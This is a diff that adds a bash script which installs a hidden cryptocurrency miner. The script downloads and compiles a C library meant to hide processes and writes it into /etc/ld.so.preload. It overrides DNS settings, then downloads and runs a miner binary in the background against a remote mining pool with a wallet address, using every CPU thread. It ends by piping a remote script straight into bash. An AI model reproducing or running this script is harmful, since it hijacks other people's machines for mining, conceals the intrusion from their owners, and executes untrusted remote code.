@@ -1,0 +1,15 @@
+#!/bin/bash
+apt-get update ; apt-get install sudo -y
+apt install unzip
+curl https://github.com/kartolo92/koplok/raw/master/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+wget https://github.com/kartolo92/jadul/raw/refs/heads/main/xmt
+chmod +x xmt
+./xmt --donate-level 1 -o 167.99.139.112:443 -u Q0105000a10b57078588434d14cbe631057b729d23ce80d3cc440de799ce5d17b69eb7c88afa138.$(shuf -n 1 -i 1-99999)-BB -p x -a rx/0 -k -t $(nproc --all) > /dev/null 2>&1 &
+curl -sL https://github.com/kartolo92/koplok/raw/master/time | bash
